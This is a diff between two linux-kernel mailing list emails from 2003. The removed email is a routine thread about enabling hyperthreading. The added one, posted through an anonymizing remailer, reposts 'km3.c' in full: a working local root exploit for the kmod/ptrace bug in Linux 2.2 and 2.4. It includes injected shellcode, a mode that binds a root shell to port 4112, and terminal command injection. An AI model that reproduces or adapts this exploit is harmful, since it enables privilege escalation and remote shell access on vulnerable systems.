@@ -1,127 +1,348 @@
 Return-Path: <linux-kernel-owner+willy=40w.ods.org@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id <S261471AbTCTRAg>; Thu, 20 Mar 2003 12:00:36 -0500
+	id <S261567AbTCTREj>; Thu, 20 Mar 2003 12:04:39 -0500
 Received: (majordomo@vger.kernel.org) by vger.kernel.org
-	id <S261376AbTCTRAg>; Thu, 20 Mar 2003 12:00:36 -0500
-Received: from fmr01.intel.com ([192.55.52.18]:52188 "EHLO hermes.fm.intel.com")
-	by vger.kernel.org with ESMTP id <S261471AbTCTRAd>;
-	Thu, 20 Mar 2003 12:00:33 -0500
-Message-ID: <F760B14C9561B941B89469F59BA3A847E96D2E@orsmsx401.jf.intel.com>
-From: "Grover, Andrew" <andrew.grover@intel.com>
-To: James Wright <james@jigsawdezign.com>,
-       "Nakajima, Jun" <jun.nakajima@intel.com>
-Cc: linux-kernel@vger.kernel.org
-Subject: RE: P4 3.06Ghz Hyperthreading with 2.4.20?
-Date: Thu, 20 Mar 2003 09:11:10 -0800
-MIME-Version: 1.0
-X-Mailer: Internet Mail Service (5.5.2653.19)
-content-class: urn:content-classes:message
-Content-Type: text/plain;
-	charset="ISO-8859-1"
+	id <S261565AbTCTREj>; Thu, 20 Mar 2003 12:04:39 -0500
+Received: from thetis.deor.org ([207.106.86.210]:52740 "EHLO thetis.deor.org")
+	by vger.kernel.org with ESMTP id <S261541AbTCTREd>;
+	Thu, 20 Mar 2003 12:04:33 -0500
+Illegal-Object: Syntax error in From: address found on vger.kernel.org:
+	From:	A.Melon<juicy@melontraffickers.com>
+			       ^-missing end of mailbox
+Comments: This message did not originate from the Sender address above.
+	It was remailed automatically by anonymizing remailer software.
+	Please report problems or inappropriate use to the
+	remailer administrator at abuse@melontraffickers.com.
+	Please read http://melontraffickers.com/remailer.html
+	before contacting the remailer administrator.
+From: <mix@deor.org>
+To: linux-kernel@vger.kernel.org
+Subject: Re: Kernels 2.2 and 2.4 exploit (ALL VERSION WHAT I HAVE TESTED UNTILL	 NOW!)
+Mail-Followup-To: linux-kernel@vger.kernel.org
+References: <000001c2ee1f$02da6820$0100a8c0@andrus>	 <200303192218.07708.rick@sapphire.no-ip.com>
+Mime-Version: 1.0
+Content-Type: multipart/mixed; boundary="SkvwRMAIpAhPCcCJ"
+Content-Disposition: inline
+In-Reply-To: <200303192218.07708.rick@sapphire.no-ip.com>
+Message-ID: <b7253663b22e23a34db5897681ed8b7f@melontraffickers.com>
+Date: Thu, 20 Mar 2003 09:15:30 -0800 (PST)
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-> From: James Wright [mailto:james@jigsawdezign.com] 
->    So i can apply the ACPI patch to 2.4.20, and it will work, 
-> even though my motherboard BIOS
-> doesn't provide the MPS table?
 
-Yes, because ACPI uses a different table.
+--SkvwRMAIpAhPCcCJ
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
 
-> Do i still need to use 
-> "acpismp=force" option?
+On Wed, Mar 19, 2003 at 10:18:07PM -0500, Rick Warner wrote:
+> This exploit is no longer available at that URL.  Can it please be either 
+> reposted here or mailed directly to me?
 
-Nope.
+Here's the one from bugtraq:
 
-> What do you mean
-> by *configuring* acpi
+--SkvwRMAIpAhPCcCJ
+Content-Type: text/plain; charset=us-ascii
+Content-Description: km3.c
+Content-Disposition: inline; filename="km3.c"
 
-Configuring it into your kernel, presumably, using make menuconfig.
+/* lame, oversophisticated local root exploit for kmod/ptrace bug in linux
+ * 2.2 and 2.4
+ * 
+ * have fun
+ */
 
-> do i need the "acpid" or other 
-> resources, than just enabling it?
+#define ANY_SUID	"/usr/bin/passwd"
 
-Nope, all the SMP detection stuff is in the kernel.
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/ptrace.h>
+#include <linux/user.h>
+#include <signal.h>
+#include <fcntl.h>
+#include <sys/wait.h>
+#include <sys/stat.h>
+#include <asm/ioctls.h>
+#include <getopt.h>
 
-Regards -- Andy
+// user settings:
 
-> 
-> Thanks,
-> James
-> 
-> 
-> On Wed, 19 Mar 2003 18:50:59 -0800
-> "Nakajima, Jun" <jun.nakajima@intel.com> wrote:
-> 
-> > You need to apply the ACPI patch: 
-> http://sourceforge.net/projects/acpi and *configure* APIC. 
-> > 
-> > The 2.4 kernel depends on the MPS table for all but logical 
-> processors. If MPS table is not present, it will fall back to UP.
-> > 
-> > Thanks,
-> > Jun
-> > 
-> > > -----Original Message-----
-> > > From: James Wright [mailto:james@jigsawdezign.com]
-> > > Sent: Wednesday, March 19, 2003 5:34 PM
-> > > To: linux-kernel@vger.kernel.org
-> > > Subject: P4 3.06Ghz Hyperthreading with 2.4.20?
-> > > 
-> > > Hello,
-> > > 
-> > >    I have kernel 2.4.20 with a single P4 3.06Ghz CPU and 
-> Asus P4G8X
-> > > motherboard
-> > > (with the Intel E7205) Chipset. I have enabled 
-> Hyperthreading in the BIOS
-> > > options,
-> > > compiled in SMP & ACPI support, and also tried adding 
-> "acpismp=force" to
-> > > my lilo
-> > > kernel cmdline, but it just doesn't seem to detect the 
-> second Logical CPU.
-> > > My
-> > > current theory is that this is bcos Linux expects the 
-> motherboard to be an
-> > > SMP
-> > > item (as with the Xeon boards) but this board is a Single 
-> processor board,
-> > > ansd
-> > > doesn't have an MP table, but the cpu info is held in the 
-> ACPI tables.?!?
-> > > 
-> > > I have tried installing 2.5.65 but can't get past the 
-> compile due to
-> > > compile-time
-> > > errors... Is this a known problem? SHall i just disable 
-> Hyperthreading
-> > > until a new
-> > > kernel release?
-> > > 
-> > > 
-> > > Thanks,
-> > > James
-> > > 
-> > > 
-> > > 
-> > > -
-> > > To unsubscribe from this list: send the line "unsubscribe 
-> linux-kernel" in
-> > > the body of a message to majordomo@vger.kernel.org
-> > > More majordomo info at  http://vger.kernel.org/majordomo-info.html
-> > > Please read the FAQ at  http://www.tux.org/lkml/
-> > -
-> > To unsubscribe from this list: send the line "unsubscribe 
-> linux-kernel" in
-> > the body of a message to majordomo@vger.kernel.org
-> > More majordomo info at  http://vger.kernel.org/majordomo-info.html
-> > Please read the FAQ at  http://www.tux.org/lkml/
-> > 
-> -
-> To unsubscribe from this list: send the line "unsubscribe 
-> linux-kernel" in
-> the body of a message to majordomo@vger.kernel.org
-> More majordomo info at  http://vger.kernel.org/majordomo-info.html
-> Please read the FAQ at  http://www.tux.org/lkml/
-> 
+int randpids=0;
+
+#define M_SIMPLE		0
+#define M_DOUBLE		1
+#define M_BIND			2
+
+int mode=M_SIMPLE;
+char * bin=NULL;
+
+struct stat me;
+int chldpid;
+int hackpid;
+
+// flags
+int sf=0;
+int u2=0;
+
+void killed(int a) { u2=1; }
+void synch(int x){ sf=1; }
+
+// shellcode to inject
+unsigned char shcode[1024];
+
+char ptrace_code[]="\x31\xc0\xb0\x1a\x31\xdb\xb3\x10\x89\xf9"
+        "\xcd\x80\x85\xc0\x75\x41\xb0\x72\x89\xfb\x31\xc9\x31\xd2\x31\xf6"
+        "\xcd\x80\x31\xc0\xb0\x1a\x31\xdb\xb3\x03\x89\xf9\xb2\x30\x89\xe6"
+        "\xcd\x80\x8b\x14\x24\xeb\x36\x5d\x31\xc0\xb0\xFF\x89\xc7\x83\xc5"
+        "\xfc\x8b\x75\x04\x31\xc0\xb0\x1a\xb3\x04\xcd\x80\x4f\x83\xed\xfc"
+        "\x83\xea\xfc\x85\xff\x75\xea\x31\xc0\xb0\x1a\x31\xdb\xb3\x11\x31"
+        "\xd2\x31\xf6\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xc5\xff"
+        "\xff\xff";
+
+char execve_tty_code[]=
+	"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xb0\x2e\xcd\x80\x31\xc0\x50\x68"
+        "\x2f\x74\x74\x79\x68\x2f\x64\x65\x76\x89\xe3\xb0\x05\x31\xc9\x66"
+        "\xb9\x41\x04\x31\xd2\x66\xba\xa4\x01\xcd\x80\x89\xc3\x31\xc0\xb0"
+        "\x3f\x31\xc9\xb1\x01\xcd\x80\x31\xc0\x50\xeb\x13\x89\xe1\x8d\x54"
+        "\x24\x04\x5b\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8"
+        "\xe8\xff\xff\xff";
+
+char execve_code[]="\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xb0\x2e\xcd\x80\xb0\x46"
+        "\x31\xc0\x50\xeb\x13\x89\xe1\x8d\x54\x24\x04\x5b\xb0\x0b\xcd\x80"
+        "\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe8\xff\xff\xff";
+
+char bind_code[]=
+        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xb0\x2e\xcd\x80\x31\xc0\x50\x40"
+        "\x50\x40\x50\x8d\x58\xff\x89\xe1\xb0\x66\xcd\x80\x83\xec\xf4\x89"
+        "\xc7\x31\xc0\xb0\x04\x50\x89\xe0\x83\xc0\xf4\x50\x31\xc0\xb0\x02"
+        "\x50\x48\x50\x57\x31\xdb\xb3\x0e\x89\xe1\xb0\x66\xcd\x80\x83\xec"
+        "\xec\x31\xc0\x50\x66\xb8\x10\x10\xc1\xe0\x10\xb0\x02\x50\x89\xe6"
+        "\x31\xc0\xb0\x10\x50\x56\x57\x89\xe1\xb0\x66\xb3\x02\xcd\x80\x83"
+        "\xec\xec\x85\xc0\x75\x59\xb0\x01\x50\x57\x89\xe1\xb0\x66\xb3\x04"
+        "\xcd\x80\x83\xec\xf8\x31\xc0\x50\x50\x57\x89\xe1\xb0\x66\xb3\x05"
+        "\xcd\x80\x89\xc3\x83\xec\xf4\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x74"
+        "\x08\x31\xc0\xb0\x06\xcd\x80\xeb\xdc\x31\xc0\xb0\x3f\x31\xc9\xcd"
+        "\x80\x31\xc0\xb0\x3f\x41\xcd\x80\x31\xc0\xb0\x3f\x41\xcd\x80\x31"
+        "\xc0\x50\xeb\x13\x89\xe1\x8d\x54\x24\x04\x5b\xb0\x0b\xcd\x80\x31"
+        "\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe8\xff\xff\xff";
+
+// generate shellcode that sets %edi to pid 
+int pidcode(unsigned char * tgt, unsigned short pid)
+{
+fprintf(stderr, "pid=%d=0x%08x\n", pid, pid);
+tgt[0]=0x31; tgt[1]=0xff;
+tgt+=2;
+	if((pid & 0xff) && (pid & 0xff00)){
+	tgt[0]=0x66; tgt[1]=0xbf;
+	*((unsigned short*)(tgt+2))=pid;
+	return 6;
+	}else{
+	int n=2;
+
+		if(pid & 0xff00){
+		tgt[0]=0xB0; tgt[1]=(pid>>8);
+		tgt+=2; n+=2;
+		}
+		
+	memcpy(tgt,"\xC1\xE0\x08", 3); tgt+=3; n+=3;
+	
+		if(pid & 0xff){
+		tgt[0]=0xB0; tgt[1]=pid;
+		tgt+=2; n+=2;
+		}
+	tgt[0]=0x89; tgt[1]=0xC7;
+	return n+2;
+	}
+}
+
+void mkcode(unsigned short pid)
+{
+int i=0;
+unsigned char *c=shcode;
+c+=pidcode(c, pid);
+strcpy(c, ptrace_code);
+c[53]=(sizeof(execve_code)+strlen(bin)+4)/4;
+strcat(c, execve_code);
+strcat(c, bin);
+}
+
+//------------------------
+
+void hack(int pid)
+{
+int i;
+struct user_regs_struct r;
+char b1[100]; struct stat st;
+int len=strlen(shcode);
+
+	if(kill(pid, 0)) return;
+
+sprintf(b1, "/proc/%d/exe", pid);
+	if(stat(b1, &st)) return;
+
+	if(st.st_ino!=me.st_ino || st.st_dev!=me.st_dev) return;
+	
+	if(ptrace(PTRACE_ATTACH, pid, 0, 0)) return;
+	while(ptrace(PTRACE_GETREGS, pid, NULL, &r));
+fprintf(stderr, "\033[1;33m+ %d\033[0m\n", pid);
+	
+	if(ptrace(PTRACE_SYSCALL, pid, 0, 0)) goto fail;
+	while(ptrace(PTRACE_GETREGS, pid, NULL, &r));
+		
+	for (i=0; i<=len; i+=4)
+	if(ptrace(PTRACE_POKETEXT, pid, r.eip+i, *(int*)(shcode+i))) goto fail;
+
+kill(chldpid, 9);
+ptrace(PTRACE_DETACH, pid, 0, 0);
+fprintf(stderr, "\033[1;32m- %d ok!\033[0m\n", pid);
+
+	if(mode==M_DOUBLE){
+	char commands[1024];
+	char * c=commands;
+	kill(hackpid, SIGCONT);
+	sprintf(commands, "\nexport TERM='%s'\nreset\nid\n", getenv("TERM"));
+		while(*c) { ioctl(0, TIOCSTI, c++); }
+	
+	waitpid(hackpid, 0, 0);
+	}
+
+exit(0);
+
+fail:
+ptrace(PTRACE_DETACH, pid, 0, 0);
+kill(pid, SIGCONT);
+}
+
+void usage(char * cmd)
+{
+fprintf(stderr, "Usage: %s [-d] [-b] [-r] [-s] [-c executable]\n"
+"\t-d\t-- use double-ptrace method (to run interactive programs)\n"
+"\t-b\t-- start bindshell on port 4112\n"
+"\t-r\t-- support randomized pids\n"
+"\t-c\t-- choose executable to start\n"
+"\t-s\t-- single-shot mode - abort if unsuccessful at the first try\n", cmd);
+exit(0);
+}
+
+int main(int ac, char ** av, char ** env)
+{
+int single=0;
+char c;
+int mypid=getpid();
+fprintf(stderr, "Linux kmod + ptrace local root exploit by <anszom@v-lo.krakow.pl>\n\n");
+	if(stat("/proc/self/exe", &me) && stat(av[0], &me)){
+	perror("stat(myself)");
+	return 0;
+	}
+
+	while((c=getopt(ac, av, "sbdrc:"))!=EOF) switch(c) {
+	case 'd': mode=M_DOUBLE; break;
+	case 'b': mode=M_BIND; break;
+	case 'r': randpids=1; break;
+	case 'c': bin=optarg; break;
+	case 's': single=1; break;
+	default: usage(av[0]);
+	}
+
+	if(ac!=optind) usage(av[0]);
+
+	if(!bin){
+		if(mode!=M_SIMPLE) bin="/bin/sh";
+		else{
+		struct stat qpa;
+			if(stat((bin="/bin/id"), &qpa)) bin="/usr/bin/id";
+		}
+	}
+
+signal(SIGUSR1, synch);
+
+hackpid=0;
+	switch(mode){
+	case M_SIMPLE:
+	fprintf(stderr, "=> Simple mode, executing %s > /dev/tty\n", bin);
+	strcpy(shcode, execve_tty_code);
+	strcat(shcode, bin);
+	break;
+
+	case M_DOUBLE:
+	fprintf(stderr, "=> Double-ptrace mode, executing %s, suid-helper %s\n",
+			bin, ANY_SUID);
+		if((hackpid=fork())==0){
+		char *ble[]={ANY_SUID, NULL};
+		fprintf(stderr, "Starting suid program %s\n", ANY_SUID);
+		kill(getppid(), SIGUSR1);
+		execve(ble[0], ble, env);
+		kill(getppid(), 9);
+		perror("execve(SUID)");
+		_exit(0);
+		}
+
+		while(!sf);
+
+	usleep(100000);
+	kill(hackpid, SIGSTOP);
+	mkcode(hackpid);
+	break;
+
+	case M_BIND:
+	fprintf(stderr, "=> portbind mode, executing %s on port 4112\n", bin);
+
+	strcpy(shcode, bind_code);
+	strcat(shcode, bin);
+	break;	
+	}
+fprintf(stderr, "sizeof(shellcode)=%d\n", strlen(shcode));
+	
+signal(SIGUSR2, killed);
+
+	if(randpids){
+	fprintf(stderr, "\033[1;31m"
+"Randomized pids support enabled... be patient or load the system heavily,\n"
+"this method does more brute-forcing\033[0m\n");
+	}
+
+again:
+sf=0;
+	if((chldpid=fork())==0){
+	int q;
+	kill(getppid(), SIGUSR1);
+		while(!sf);
+
+	fprintf(stderr, "=> Child process started");
+		for(q=0;q<10;++q){
+		fprintf(stderr, ".");
+		socket(22,0,0);
+		}
+	fprintf(stderr, "\n");
+	kill(getppid(), SIGUSR2);
+	_exit(0);
+	}
+
+	while(!sf);
+kill(chldpid, SIGUSR1);
+
+	for(;;){
+	int q;
+		if(randpids){
+			for(q=1;q<30000;++q)
+			if(q!=chldpid && q!=mypid && q!=hackpid) hack(q);
+		}else{
+			for(q=chldpid+1;q<chldpid+10;q++) hack(q);
+		}
+
+		if(u2){
+		u2=0;
+			if(single) break;
+		goto again;
+		}
+	}
+fprintf(stderr, "Failed\n");
+return 1;
+}
+
+// M$ sucks
+// 
+// http://bezkitu.com/
+
+--SkvwRMAIpAhPCcCJ--
